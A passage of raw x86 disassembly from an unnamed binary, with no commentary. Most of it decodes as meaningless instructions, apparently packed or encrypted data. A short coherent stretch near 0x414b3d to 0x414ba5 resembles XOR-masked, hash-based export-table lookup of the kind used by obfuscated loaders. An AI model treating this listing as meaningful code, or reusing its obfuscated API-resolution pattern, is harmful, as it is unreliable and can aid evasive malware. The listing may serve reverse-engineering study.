  414836:	imul   esp,DWORD PTR [edi],0x4b9c4f4a
  41483c:	jb     0x414895
  41483e:	jno    0x41484a
  414840:	shr    dh,cl
  414842:	mov    ecx,0xc0cb9e7a
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41483c
  414861:	nop
  414862:	xor    BYTE PTR [esi],0x12
  414865:	jge    0x4148e6
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148ea
  41486d:	mov    esp,0xf9c5b0e8
  414872:	icebp  
  414873:	in     eax,0xcb
  414875:	mov    es,WORD PTR [edi]
  414877:	cwde   
  414878:	rol    bh,0xa6
  41487b:	add    cl,BYTE PTR [ebx-0xb86ad0f]
  414881:	into   
  414882:	fisub  WORD PTR [edi]
  414884:	xchg   DWORD PTR [esi+0xb],edx
  414887:	repnz cs xchg ebp,eax
  41488a:	cmp    al,dl
  41488c:	sti    
  41488d:	retf   
  41488e:	sbb    cl,al
  414890:	mov    DWORD PTR [edx],esp
  414892:	mov    dh,0x96
  414894:	les    edx,FWORD PTR [eax+0x28f2480e]
  41489a:	sti    
  41489b:	cs shl cl,0x29
  41489f:	adc    cl,BYTE PTR [edi+0x36af6b8d]
  4148a5:	mov    dh,0x98
  4148a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a8:	mov    eax,0xca92c2d1
  4148ad:	int    0x49
  4148af:	dec    edx
  4148b0:	jb     0x414904
  4148b2:	(bad)  
  4148b3:	mov    edi,0x431fbcbc
  4148b8:	xchg   esi,eax
  4148b9:	dec    edx
  4148ba:	and    al,0xf4
  4148bc:	cli    
  4148bd:	fsub   DWORD PTR [eax+edi*8-0x13]
  4148c1:	pop    ebx
  4148c2:	ins    BYTE PTR es:[edi],dx
  4148c3:	sahf   
  4148c4:	(bad)  
  4148c5:	cli    
  4148c6:	and    DWORD PTR [esi+0xc],ebp
  4148c9:	not    BYTE PTR [edi-0x65]
  4148cc:	scas   al,BYTE PTR es:[edi]
  4148cd:	dec    edi
  4148ce:	xchg   esi,eax
  4148cf:	scas   al,BYTE PTR es:[edi]
  4148d0:	int3   
  4148d1:	cmp    esi,DWORD PTR [edx-0x6e]
  4148d4:	lods   al,BYTE PTR ds:[esi]
  4148d5:	xor    al,0xf4
  4148d7:	or     DWORD PTR [ecx+ebp*4+0x38f446fe],ebx
  4148de:	jne    0x414958
  4148e0:	inc    eax
  4148e1:	outs   dx,BYTE PTR ds:[esi]
  4148e2:	cmp    DWORD PTR ds:0x37238313,esp
  4148e8:	mov    edx,0xebf4be31
  4148ed:	mov    dh,0x30
  4148ef:	or     ecx,DWORD PTR [eax+0x53a19ea8]
  4148f5:	in     eax,0xb1
  4148f7:	fsub   QWORD PTR [eax-0x28]
  4148fa:	jnp    0x41489f
  4148fc:	push   ds
  4148fd:	call   0x5696832f
  414902:	pop    ds
  414903:	jbe    0x414909
  414905:	out    0xb5,al
  414907:	sahf   
  414908:	and    ecx,DWORD PTR [eax]
  41490a:	push   ss
  41490b:	loop   0x414987
  41490d:	jmp    0xa942:0x9e059743
  414914:	lods   al,BYTE PTR ds:[esi]
  414915:	mov    cl,0x82
  414917:	inc    ebx
  414918:	jle    0x4148c1
  41491a:	xor    DWORD PTR [eax-0x15],0x6581d1c1
  414921:	outs   dx,BYTE PTR ds:[esi]
  414922:	mov    ebx,0xd586921a
  414927:	loop   0x41491b
  414929:	mov    eax,eax
  41492b:	jns    0x414955
  41492d:	add    eax,0x51681c9d
  414932:	(bad)  
  414933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414934:	popf   
  414935:	cmp    DWORD PTR [ecx+ebx*4+0x55],esp
  414939:	loopne 0x4148ea
  41493b:	mov    edi,DWORD PTR [ecx]
  41493d:	pop    ebp
  41493e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41493f:	inc    edi
  414940:	inc    eax
  414941:	aam    0x1e
  414943:	fst    DWORD PTR [ebp+0x1699c221]
  414949:	ret    0xeb60
  41494c:	imul   edi,DWORD PTR [esi],0x16bd5bd2
  414952:	lods   eax,DWORD PTR ds:[esi]
  414953:	mov    DWORD PTR [esi*1+0x342b9f8d],edi
  41495a:	add    dl,BYTE PTR [edi]
  41495c:	sbb    al,0xec
  41495e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41495f:	sub    eax,0x53249aa8
  414964:	scas   eax,DWORD PTR es:[edi]
  414965:	sub    ch,BYTE PTR [ebx-0x63]
  414968:	mov    edx,?
  41496a:	add    al,0xaa
  41496c:	sahf   
  41496d:	lock xchg edx,eax
  41496f:	mov    bl,0xfd
  414971:	sbb    eax,0x814d4f94
  414976:	icebp  
  414977:	xlat   BYTE PTR cs:[ebx]
  414979:	pop    ecx
  41497a:	xchg   edx,eax
  41497b:	or     esp,ecx
  41497d:	pop    ebp
  41497e:	ret    0x5c40
  414981:	sbb    DWORD PTR [edi+0x18],edx
  414984:	lea    esp,[eax+edx*1]
  414987:	retf   0x1fd
  41498a:	push   edi
  41498b:	imul   ebp,ebx,0x5d
  41498e:	push   0x54
  414990:	cmp    ebx,ebx
  414992:	xchg   BYTE PTR gs:[ebp-0x7179c8f1],dl
  414999:	pop    ebp
  41499a:	adc    DWORD PTR [edi+0x6ba0e3b3],ecx
  4149a0:	push   eax
  4149a1:	sub    al,dl
  4149a3:	cmp    esp,DWORD PTR ds:0x35c76f67
  4149a9:	iret   
  4149aa:	xchg   edi,eax
  4149ab:	mov    ecx,0xe175ae84
  4149b0:	popa   
  4149b1:	sub    al,0x1d
  4149b3:	add    al,0x12
  4149b5:	cmp    BYTE PTR [edx+0x43],0x8b
  4149b9:	push   ss
  4149ba:	or     DWORD PTR ds:0x11f81,ebp
  4149c0:	gs (bad) 
  4149c2:	into   
  4149c3:	pusha  
  4149c4:	pop    ebx
  4149c5:	sub    edi,DWORD PTR [edx-0x2]
  4149c8:	push   esp
  4149c9:	jg     0x414988
  4149cb:	push   esi
  4149cc:	jp     0x4149ae
  4149ce:	(bad)  
  4149cf:	out    dx,eax
  4149d0:	xor    ch,BYTE PTR [ebx]
  4149d2:	sub    eax,0xd4698d1c
  4149d7:	(bad)  
  4149d8:	loop   0x414a54
  4149da:	jne    0x4149a8
  4149dc:	icebp  
  4149dd:	(bad)  
  4149df:	push   ebp
  4149e0:	imul   eax,ebx,0xffffffc3
  4149e3:	inc    eax
  4149e4:	mov    ebp,0xd27f3934
  4149e9:	push   edx
  4149ea:	mov    edi,0x20bfcd5c
  4149ef:	add    al,0xb
  4149f1:	and    dh,ah
  4149f3:	mov    eax,0x5268dd6d
  4149f8:	nop
  4149f9:	inc    ebx
  4149fa:	shl    BYTE PTR [esi+0x3fb388d8],cl
  414a00:	jmp    0xcddc:0x2856e73a
  414a07:	in     al,dx
  414a08:	xchg   esp,eax
  414a09:	adc    ebp,ebx
  414a0b:	outs   dx,DWORD PTR ds:[esi]
  414a0c:	mov    al,ds:0x9be82d8c
  414a11:	es jnp 0x4149b7
  414a14:	leave  
  414a15:	ja     0x414a00
  414a17:	mov    DWORD PTR [ebp-0x62],0xdfb784a
  414a1e:	dec    ebp
  414a1f:	shl    esp,0xcb
  414a22:	in     eax,dx
  414a23:	(bad)  
  414a24:	les    esi,FWORD PTR [edi]
  414a26:	push   ebp
  414a27:	test   BYTE PTR [ebx],ch
  414a29:	dec    ebp
  414a2a:	mov    bl,0x6f
  414a2c:	sbb    al,BYTE PTR [eax+0x15]
  414a2f:	mov    ds:0x5cbd1720,eax
  414a34:	xlat   BYTE PTR ds:[ebx]
  414a35:	stos   DWORD PTR es:[edi],eax
  414a36:	loopne 0x414a8d
  414a38:	mov    ?,ecx
  414a3a:	and    edx,DWORD PTR [eax-0x55fe0baf]
  414a40:	fucomp st(4)
  414a42:	xchg   DWORD PTR [ecx-0xad04611],eax
  414a48:	hlt    
  414a49:	les    edi,FWORD PTR [edi+edx*4-0x12]
  414a4d:	pop    edi
  414a4e:	test   eax,0x6089eccc
  414a53:	or     BYTE PTR ds:0x1348b2f2,0xa8
  414a5a:	ins    BYTE PTR es:[edi],dx
  414a5b:	mov    fs,esi
  414a5d:	add    ah,bh
  414a5f:	jl     0x414a3a
  414a61:	je     0x414a68
  414a63:	dec    edx
  414a64:	and    edx,DWORD PTR [edx+eax*1-0x676213b0]
  414a6b:	das    
  414a6c:	seto   BYTE PTR [ecx+eiz*4-0x6c]
  414a71:	push   ecx
  414a72:	inc    ebx
  414a73:	push   esp
  414a74:	ret    0xd8ed
  414a77:	jle    0x414a1d
  414a79:	mov    edx,0xf6b799f3
  414a7e:	shl    BYTE PTR [ebx+0x76652e79],0xdd
  414a85:	pop    es
  414a86:	inc    esi
  414a87:	je     0x414a70
  414a89:	int3   
  414a8a:	int3   
  414a8b:	or     dh,dh
  414a8d:	pop    ss
  414a8e:	aad    0x88
  414a90:	pop    es
  414a91:	fnstenv [edx+edi*8+0x48]
  414a95:	jbe    0x414b00
  414a97:	inc    edx
  414a98:	xchg   edx,eax
  414a99:	mov    ah,0x21
  414a9b:	mov    al,ds:0xcf16eaee
  414aa0:	push   esp
  414aa1:	sbb    BYTE PTR [ebx+esi*8+0x58],dl
  414aa5:	and    al,0x66
  414aa7:	sbb    DWORD PTR [eax],ebp
  414aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aaa:	out    dx,al
  414aab:	mov    eax,ds:0x8ce9d0cc
  414ab0:	push   0xead94bfc
  414ab5:	pop    es
  414ab6:	ficomp DWORD PTR ds:0xeeeaf610
  414abc:	adc    DWORD PTR [edx],ebp
  414abe:	and    ecx,ebx
  414ac0:	mov    edi,0x6cec56ee
  414ac5:	pop    ds
  414ac6:	data16 arpl WORD PTR [edx],bp
  414ac9:	push   ecx
  414aca:	sahf   
  414acb:	mov    esp,0x32edf61d
  414ad0:	jns    0x414b28
  414ad2:	jns    0x414b51
  414ad4:	cmp    cl,BYTE PTR [esi+edi*2]
  414ad7:	jo     0x414aa2
  414ad9:	bnd addr16 jne 0x414ac4
  414add:	or     BYTE PTR [edi-0x22],bl
  414ae0:	retf   0xe4c4
  414ae3:	imul   eax,DWORD PTR [esp+eiz*4],0xffffffc4
  414ae7:	inc    esi
  414ae8:	dec    eax
  414ae9:	xchg   edi,eax
  414aea:	lds    esi,FWORD PTR ds:0xa00d4eb5
  414af0:	adc    DWORD PTR [esi],0x126d2c4a
  414af6:	jo     0x414aa0
  414af8:	mov    eax,0x484471e
  414afd:	in     al,0x91
  414aff:	out    0x36,al
  414b01:	imul   esp,DWORD PTR [edi-0x23c8f6ca],0xa96813dd
  414b0b:	push   ss
  414b0c:	and    ecx,DWORD PTR [esi-0x29]
  414b0f:	dec    ebp
  414b10:	bound  ecx,QWORD PTR [edi-0x4f]
  414b13:	and    al,0x40
  414b15:	cmp    eax,0x24d53f64
  414b1a:	sbb    al,0x7c
  414b1c:	(bad)  
  414b1d:	fld    QWORD PTR [ebx]
  414b1f:	fistp  WORD PTR [edi+0x76c84588]
  414b25:	jg     0x414b83
  414b27:	sub    ah,BYTE PTR [eax-0x29]
  414b2a:	xor    cl,ch
  414b2c:	es mov fs,ebp
  414b2f:	pop    ecx
  414b30:	mov    eax,0xc3036da3
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	ficom  DWORD PTR [edi+0x6]
  414bb9:	or     eax,0x707f7b5b
  414bbe:	mov    ecx,0xe470707e
  414bc3:	outs   dx,BYTE PTR ds:[esi]
  414bc4:	xchg   ecx,eax
  414bc5:	push   edi
  414bc6:	mov    bh,0x5a
  414bc8:	loop   0x414bf5
  414bca:	jo     0x51d17764
  414bd0:	bound  esp,QWORD PTR [ebx-0x3deb7694]
  414bd6:	sbb    ecx,DWORD PTR [di+0x29bf]
  414bdb:	hlt    
  414bdc:	and    DWORD PTR [edi],edi
  414bde:	(bad)  
  414bdf:	or     ebx,DWORD PTR [edi]
  414be1:	push   eax
  414be2:	push   cs
  414be3:	out    dx,al
  414be4:	data16 jae 0x414c25
  414be7:	xchg   ebx,eax
  414be8:	sbb    ebp,DWORD PTR [ebp-0x5dcac6d0]
  414bee:	retf   0x29ad
  414bf1:	ds mov cl,0x51
  414bf4:	xchg   bl,ch
  414bf6:	in     eax,0x9b
  414bf8:	ret    
  414bf9:	jmp    0x1575:0x34d10632
  414c00:	inc    edi
  414c01:	mov    bl,0xa
  414c03:	mov    dh,bl
  414c05:	loop   0x414c34
  414c07:	mov    bl,0xc0
  414c09:	mov    bl,0x6d
  414c0b:	mov    edi,0x7c8e373c
  414c10:	pop    ebx
  414c11:	std    
  414c12:	cwde   
  414c13:	cmp    edx,DWORD PTR [ebx]
  414c15:	jle    0x414ba8
  414c17:	dec    esp
  414c18:	xchg   ecx,eax
  414c19:	jbe    0x414c3e
  414c1b:	push   ebx
  414c1c:	leave  
  414c1d:	pusha  
  414c1e:	leave  
  414c1f:	iret   
  414c20:	jg     0x414bbc
  414c22:	and    DWORD PTR [ecx],esi
  414c24:	nop
  414c25:	div    BYTE PTR [ebx]
  414c27:	mov    bl,0x48
  414c29:	xchg   edi,eax
  414c2a:	cmp    DWORD PTR [esi],edx
  414c2c:	das    
  414c2d:	fcom   DWORD PTR [edx-0x48]
  414c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c31:	add    BYTE PTR [edi],al
  414c33:	add    eax,0x99c3332
  414c38:	out    dx,al
  414c39:	xlat   BYTE PTR ds:[ebx]
  414c3a:	pop    ecx
  414c3b:	mov    ch,0x62
  414c3d:	and    esi,ebx
  414c3f:	out    0xda,al
  414c41:	and    dl,BYTE PTR [ebx]
  414c43:	iret   
  414c44:	in     al,dx
  414c45:	mov    ds:0x46174f05,al
  414c4a:	les    ecx,FWORD PTR [edi-0x76]
  414c4d:	call   0x46035bfb
  414c52:	iret   
  414c53:	sub    eax,0x3fcedc23
  414c58:	sbb    DWORD PTR [edx+0x74],0x5b
  414c5c:	mov    ebp,0x33dad024
  414c61:	arpl   bp,cx
  414c63:	mov    bh,0x5d
  414c65:	or     eax,0xa8b712a9
  414c6a:	jo     0x414ca3
  414c6c:	mov    esp,0x98026ada
  414c71:	into   
  414c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c73:	jmp    0x414c69
  414c75:	std    
  414c76:	sbb    bl,BYTE PTR [edi]
  414c78:	jp     0x414c01
  414c7a:	repnz retf 
  414c7c:	fdivrp st(2),st
  414c7e:	daa    
  414c7f:	call   0xf047:0x600059a8
  414c86:	outs   dx,DWORD PTR ds:[esi]
  414c87:	or     eax,0x20cc7e66
  414c8d:	sti    
  414c8e:	and    BYTE PTR [edx+0x17cf4e77],bl
  414c94:	test   BYTE PTR [edi+0x65],cl
  414c97:	sub    eax,esi
  414c99:	inc    ebx
  414c9a:	or     eax,DWORD PTR [ebx+0x7820a0b7]
  414ca0:	jns    0x414ce4
  414ca2:	jmp    0xa16764e4
  414ca7:	aad    0xf1
  414ca9:	rcr    DWORD PTR [eax+0x10],cl
  414cac:	fisubr WORD PTR [edi]
  414cae:	idiv   DWORD PTR [ecx-0x2e]
  414cb1:	test   BYTE PTR [eax-0x10],al
  414cb4:	shr    BYTE PTR [ebx],0xc9
  414cb7:	xor    DWORD PTR [ecx],0xffffff86
  414cba:	inc    edi
  414cbb:	rcl    DWORD PTR [eax-0x6],0x68
  414cbf:	dec    BYTE PTR [edx+0x4a]
  414cc2:	mov    DWORD PTR [edi-0x34],eax
  414cc5:	sahf   
  414cc6:	xchg   ecx,eax
  414cc7:	lea    ecx,[esp+ecx*4-0x7e9570ef]
  414cce:	mov    esi,0x6c008e26
  414cd3:	gs test al,0xf
  414cd6:	pop    ss
  414cd7:	fnstcw WORD PTR [eax-0x59ae0da7]
  414cdd:	mov    bh,0x9
  414cdf:	xchg   ebp,eax
  414ce0:	pop    eax
  414ce1:	xchg   edx,eax
  414ce2:	sbb    edi,esp
  414ce4:	mov    DWORD PTR [ebx-0x55],esp
  414ce7:	xor    edx,DWORD PTR ds:0xa5ec9a87
  414ced:	ds pushf 
  414cef:	add    eax,0x1b0a5035
  414cf4:	(bad)  
  414cf5:	fisubr DWORD PTR [eax]
  414cf8:	jo     0x414d74
  414cfa:	call   0x360c00af
  414cff:	mov    eax,0x26c9dbfd
  414d04:	pop    esi
  414d05:	jg     0x414d79
  414d07:	mov    dl,0x76
  414d09:	push   ebx
  414d0a:	mov    al,BYTE PTR [edi+0x58]
  414d0d:	cmp    eax,0xdb5aaadd
  414d12:	fidiv  WORD PTR [edi-0x6e]
  414d15:	ins    DWORD PTR es:[edi],dx
  414d16:	retf   
  414d17:	in     eax,0x30
  414d19:	xor    eax,DWORD PTR [eax]
  414d1b:	jg     0x414d19
  414d1d:	sbb    edx,edi
  414d1f:	mov    bh,0xd5
  414d21:	jge    0x414ca4
  414d23:	ror    DWORD PTR [esp+esi*1-0x537694d6],0x51
  414d2b:	fdiv   st(7),st
  414d2d:	out    dx,al
  414d2e:	inc    edx
  414d2f:	xchg   ebp,eax
  414d30:	ret    
  414d31:	push   0xffffffc6
  414d33:	xor    eax,0xea4433b3
  414d38:	sbb    eax,0x9a9db1
  414d3d:	dec    eax
  414d3e:	mov    edi,0x3f6ea29c
  414d43:	xchg   BYTE PTR [ebx+ebp*8-0x66],dl
  414d47:	test   ebp,esi
  414d49:	xchg   edx,eax
  414d4a:	repz sub DWORD PTR [esi+0x55],esp
  414d4e:	inc    edi
  414d4f:	test   DWORD PTR [ebp+eiz*2+0x7],esp
  414d53:	loopne 0x414d25
  414d55:	out    0x69,eax
  414d57:	(bad)  [ebp-0x2f6808c4]
  414d5d:	call   0x5882:0x9b85e4f8
  414d64:	aas    
  414d65:	out    dx,eax
  414d66:	xlat   BYTE PTR ds:[ebx]
  414d67:	add    al,0x16
  414d69:	nop
  414d6a:	pop    eax
  414d6b:	fild   DWORD PTR ds:0x86ef7cc8
  414d71:	mov    DWORD PTR [ecx],0xd7fac8fa
  414d77:	jmp    0xe5267f36
  414d7c:	mov    dl,BYTE PTR [ecx+0x63]
  414d7f:	jge    0x414dbe
  414d81:	inc    ebp
  414d82:	fmul   st,st(2)
  414d84:	cmp    BYTE PTR [ebp+0x34f0ac72],cl
  414d8a:	jns    0x414d99
  414d8c:	repz mov esi,0x3e596687
  414d92:	or     eax,0x3f871f2d
  414d97:	adc    BYTE PTR [edx+eiz*4],dh
  414d9a:	jae    0x414dd5
  414d9c:	imul   edx,DWORD PTR [ebx],0xffffffdc
  414d9f:	and    esi,edx
  414da1:	xchg   edx,eax
  414da2:	dec    DWORD PTR [ecx+esi*4-0x25]
  414da6:	fnstenv [ecx]
  414da8:	daa    
  414da9:	jo     0x414d99
  414dab:	mov    esi,0xe4e95a7d
  414db0:	fild   WORD PTR [edx+eax*2-0x2f8353ea]
  414db7:	retf   0xc6b8
  414dba:	push   edx
  414dbb:	dec    ebp
  414dbc:	pop    es
  414dbd:	sbb    bh,BYTE PTR [edi]
  414dbf:	dec    esi
  414dc0:	in     eax,0xc3
  414dc2:	xor    dh,al
  414dc4:	enter  0xf4fd,0xf
  414dc8:	cmp    ah,BYTE PTR [eax+ebx*4]
  414dcb:	mov    eax,ds:0x64f945a9
  414dd0:	test   DWORD PTR [esi+0x2b],ebp
  414dd3:	jae    0x414e53
  414dd5:	mov    bh,0x5a
  414dd7:	fmul   st(5),st
  414dd9:	sbb    esp,DWORD PTR [ebp+0x47413805]
  414ddf:	sub    al,0x1
  414de1:	cmp    DWORD PTR [esi+0x39],ecx
  414de4:	cli    
  414de5:	mov    ds,WORD PTR [ecx+edx*1]
  414de8:	inc    esp
  414de9:	gs loopne 0x414d9c
  414dec:	inc    ecx
  414ded:	iret   
  414dee:	(bad)  
  414def:	retf   
  414df0:	scas   al,BYTE PTR es:[edi]
  414df1:	je     0x414e51
  414df3:	and    BYTE PTR [edi],dl
  414df5:	pop    ecx
  414df6:	pop    ecx
  414df7:	mov    ebp,0x24e3c323
  414dfc:	(bad)  
  414dfd:	xchg   esp,eax
  414dfe:	mov    dh,0xe2
  414e00:	jl     0x414daa
  414e02:	loopne 0x414e7a
  414e04:	bound  ecx,QWORD PTR [esi]
  414e06:	fcomp  QWORD PTR [ebx+ecx*4]
  414e09:	pop    ecx
  414e0a:	adc    esi,ecx
  414e0c:	shl    BYTE PTR [edi],1
  414e0e:	test   BYTE PTR [esi-0x528a659b],al
  414e14:	jmp    0x414da2
  414e16:	lock lahf 
  414e18:	aam    0x4
  414e1a:	inc    ebx
  414e1b:	test   eax,0xd03925e1
  414e20:	test   al,0xa7
  414e22:	ins    BYTE PTR es:[edi],dx
  414e23:	(bad)  
  414e24:	(bad)  
  414e25:	fsub   st(2),st
  414e27:	sbb    ebp,edi
  414e29:	es pop eax
  414e2b:	xchg   esp,eax
  414e2c:	mov    esi,0xa183e8a1
  414e31:	or     esp,DWORD PTR [edx+0x54281931]
  414e37:	scas   al,BYTE PTR es:[edi]
  414e38:	jmp    0x414dbd
  414e3a:	mov    edx,0xca3dca4f
  414e3f:	inc    ecx
  414e40:	lods   al,BYTE PTR ds:[esi]
  414e41:	adc    BYTE PTR [edi],al
  414e43:	(bad)  
  414e45:	pop    edx
  414e46:	inc    ebx
  414e47:	push   esp
  414e48:	fs xchg edx,eax
  414e4a:	jns    0x414e5c
  414e4c:	pop    esi
  414e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e4e:	cdq    
  414e4f:	imul   BYTE PTR [ecx-0x12]
  414e52:	mov    ebx,0x7e7f5fbc
  414e57:	lahf   
  414e58:	test   eax,0x28583ef4
  414e5d:	or     al,0xcd
  414e5f:	je     0x414ec5
  414e61:	mov    ds:0x34606e34,al
  414e66:	and    al,BYTE PTR [esi]
  414e68:	imul   ebp,DWORD PTR [ebx+eax*1-0x6a],0x7e0125ae
  414e70:	mov    eax,ds:0xc5c79bb3
  414e75:	ret    
  414e76:	leave  
  414e77:	jge    0x414e46
  414e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e7a:	push   ebp
  414e7b:	push   edi
  414e7c:	xor    ebx,DWORD PTR ds:0x63cf6ab1
  414e82:	aad    0x84
  414e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e85:	rol    BYTE PTR [eax+ebp*4],1
  414e88:	or     al,0x59
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	push   0xfffffff8
  414eae:	in     al,dx
  414eaf:	ins    BYTE PTR es:[edi],dx
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414ef8
  414eb9:	pop    es
  414eba:	cs sbb ecx,edx
  414ebd:	mov    esp,0xf4241025
  414ec2:	and    eax,0xb5f5a0f1
  414ec7:	dec    eax
  414ec8:	jo     0x414f48
  414eca:	cdq    
  414ecb:	es mov dh,0x49
  414ece:	lea    ebx,[edx+ecx*8+0x41]
  414ed2:	nop
  414ed3:	ins    BYTE PTR es:[edi],dx
  414ed4:	and    ebx,DWORD PTR [edi]
  414ed6:	inc    esi
  414ed7:	call   0x3698:0x80b6c105
  414ede:	adc    ebx,DWORD PTR [edx+0x1c]
  414ee1:	ins    DWORD PTR es:[edi],dx
  414ee2:	mov    ah,ah
  414ee4:	pusha  
  414ee5:	test   DWORD PTR ds:0x6f53ee49,edx
  414eeb:	int    0xc1
  414eed:	popa   
  414eee:	iret   
  414eef:	mov    ecx,0x3359a151
  414ef4:	sub    eax,0xb0219cb
  414ef9:	and    BYTE PTR [ebx-0x2],al
  414efc:	mov    bl,0xd7
  414efe:	mov    edi,0x7bb03d76
  414f03:	in     al,0x14
  414f05:	mov    esi,0xf4f3832e
  414f0a:	cmp    al,0x2e
  414f0c:	test   al,0x35
  414f0e:	fcom   DWORD PTR [esi-0x5f438481]
  414f14:	and    al,0xb3
  414f16:	mov    ds:0x6934d8a0,eax
  414f1b:	(bad)  
  414f1c:	sbb    bl,BYTE PTR [edx-0xf]
  414f1f:	jge    0x414f73
  414f21:	xor    eax,0xb27e436c
  414f26:	jmp    0x761dbdac
  414f2b:	mov    bl,ch
  414f2d:	pop    es
  414f2e:	stos   BYTE PTR es:[edi],al
  414f2f:	aas    
  414f30:	adc    dh,dl
  414f32:	mov    dh,0xd6
  414f34:	xchg   esp,eax
  414f35:	ins    BYTE PTR es:[edi],dx
  414f36:	pop    edx
  414f37:	xor    DWORD PTR [ebx],0x3b
  414f3a:	lea    ebx,[edi-0x2eb6052]
  414f40:	mov    BYTE PTR [edx+0xd],dl
  414f43:	and    dh,ch
  414f45:	push   es
  414f46:	add    ah,al
  414f48:	xchg   edx,eax
  414f49:	cmp    bh,BYTE PTR [edx-0x2c31b0c7]
  414f4f:	pop    edi
  414f50:	lods   al,BYTE PTR ds:[esi]
  414f51:	rcr    DWORD PTR [ebx],1
  414f53:	(bad)  
  414f55:	inc    eax
  414f56:	jne    0x414f4e
  414f58:	retf   0x514d
  414f5b:	repnz adc esi,DWORD PTR [esi+ecx*8]
  414f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f60:	loope  0x414fc0
  414f62:	aas    
  414f63:	jmp    0xfd5ed10b
  414f68:	aas    
  414f69:	pop    ebp
  414f6a:	mov    ebx,0x945045fb
  414f6f:	gs adc al,0xd7
  414f72:	inc    esi
  414f73:	addr16 push eax
  414f75:	pop    edi
  414f76:	push   ss
  414f77:	jbe    0x414f94
  414f79:	fisub  DWORD PTR [esi-0x74]
  414f7c:	aad    0xef
  414f7e:	push   ecx
  414f7f:	jno    0x414f09
  414f81:	test   al,0x39
  414f83:	cmp    al,0xc3
  414f85:	jecxz  0x414faf
  414f87:	repnz outs dx,DWORD PTR ds:[esi]
  414f89:	inc    edi
  414f8a:	mov    bl,0x7b
  414f8c:	cmp    BYTE PTR [esi+esi*8+0x24c6a129],bl
  414f93:	out    0xe5,al
  414f95:	or     eax,0x2ed5bef9
  414f9a:	dec    ebx
  414f9b:	inc    ebx
  414f9c:	in     al,dx
  414f9d:	mov    eax,0xea7dd584
  414fa2:	mov    esp,0xf57d16c2
  414fa7:	inc    eax
  414fa8:	sbb    DWORD PTR [esi-0x79],0x88b7b37c
  414faf:	push   es
  414fb0:	leave  
  414fb1:	add    ax,0xf462
  414fb5:	xor    BYTE PTR [eax+0x45],ah
  414fb8:	fdivr  QWORD PTR [edx+esi*2]
  414fbb:	cmp    BYTE PTR [ebx],bl
  414fbd:	lahf   
  414fbe:	test   DWORD PTR [edi],ebp
  414fc0:	out    dx,eax
  414fc1:	int3   
  414fc2:	xlat   BYTE PTR es:[ebx]
  414fc4:	jmp    0xd4b7ac6b
  414fc9:	fidivr DWORD PTR [ebp+0x59]
  414fcc:	dec    esp
  414fcd:	outs   dx,BYTE PTR ds:[esi]
  414fce:	dec    edi
  414fcf:	mov    BYTE PTR [ecx],bl
  414fd1:	xchg   BYTE PTR [edx+0x4e],al
  414fd4:	es js  0x414f83
  414fd7:	xor    al,BYTE PTR cs:[edi+0x8]
  414fdb:	or     ah,BYTE PTR [edi+0x4be81cba]
  414fe1:	ja     0x414f8c
  414fe3:	int    0xff
  414fe5:	pusha  
  414fe6:	out    0x9e,al
  414fe8:	ret    0x4954
  414feb:	pop    edx
  414fec:	sub    BYTE PTR [edi+0x3b],ah
  414fef:	je     0x414fcc
  414ff1:	dec    esp
